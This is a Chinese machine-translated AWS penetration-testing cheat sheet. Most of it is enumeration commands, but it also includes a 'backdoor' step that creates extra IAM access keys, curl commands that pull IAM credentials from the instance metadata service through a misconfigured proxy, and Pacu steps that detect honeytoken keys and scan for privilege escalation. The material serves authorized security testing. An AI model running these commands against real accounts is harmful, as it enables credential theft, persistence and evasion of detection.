# 有用的 Pentest 笔记:云版

> 原文：<https://infosecwriteups.com/useful-pentest-notes-cloud-edition-8c44382fc1a8?source=collection_archive---------5----------------------->

## AWS 备忘单

![](img/aaf0c693c5122a89a72cf6591f1bae28.png)

unsplash.com

# 证明

为身份验证设置 AWS 编程密钥(对于新的配置文件，使用— profile=)

```
aws configure
```

## 开放 S3 桶枚举

列出一个 S3 桶的内容

```
aws s3 ls s3://<bucketname>/
```

下载存储桶的内容

```
aws s3 sync s3://bucketname s3-files-dir
```

## 账户信息

获取基本帐户信息

```
aws sts get-caller-identity
```

列出 IAM 用户

```
aws iam list-users
```

列出 IAM 角色

```
aws iam list-roles
```

列出帐户可访问的 S3 时段

```
aws s3 ls
```

## 虚拟机

列出 EC2 实例

```
aws ec2 describe-instances
```

## web 应用程序和 SQL

列出 web 应用程序

```
aws deploy list-applications
```

列出 AWS RDS (SQL)

```
aws rds describe-db-instances --region <region name>
```

知道了 VPC 安全组 ID，您可以查询防火墙规则来确定连接潜力

```
aws ec2 describe-security-groups --group-ids <VPC Security Group ID> --region <region>
```

## 无服务器

列出 Lambda 函数

```
aws lambda list-functions --region <region>
```

查看为机密设置的环境变量并分析代码

```
aws lambda get-function --function-name <lambda function>
```

## 建立工作关系网

列出 EC2 子网

```
aws ec2 describe-subnets
```

列出 ec2 网络接口

```
aws ec2 describe-network-interfaces
```

列出直接连接(VPN)连接

```
aws directconnect describe-connections
```

## 后门

列出用户的访问键

```
aws iam list-access-keys --user-name <username>
```

具有第二组访问密钥的后门帐户

```
aws iam create-access-key --user-name <username>
```

# 实例元数据服务 URL

```
[http://169.254.169.254/latest/meta-data](http://169.254.169.254/latest/meta-data)
```

此处可能提供额外的 IAM 证书

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

如果代理服务(如 Nginx)被托管在 AWS 中并且配置错误，可能会受到外部攻击

```
curl --proxy vulndomain.target.com:80 [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/) && echo
```

IMDS 版本 2 有一些保护，但这些命令可以用来访问它

```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
curl [http://169.254.169.254/latest/meta-data/profile](http://169.254.169.254/latest/meta-data/profile) -H "X-aws-ec2-metadata-token: $TOKEN"
```

# 其他 AWS 工具

## 古怪的

[https://github.com/carnal0wnage/weirdAAL](https://github.com/carnal0wnage/weirdAAL)

对所有 AWS 服务运行 recon，以枚举一组密钥的访问权限

```
python3 weirdAAL.py -m recon_all -t <name>
```

## 帕库

AWS 开发框架

https://github.com/RhinoSecurityLabs/pacu

安装 Pacu

```
sudo apt-get install python3-pip
git clone [https://github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
cd pacu
sudo bash install.sh
```

导入特定配置文件的 AWS 密钥

```
import_keys <profile name>
```

检测密钥是否为蜜罐令牌密钥

```
run iam__detect_honeytokens
```

枚举帐户信息和权限

```
run iam__enum_users_roles_policies_groups
run iam__enum_permissions
whoami
```

检查权限提升

```
run iam__privesc_scan
```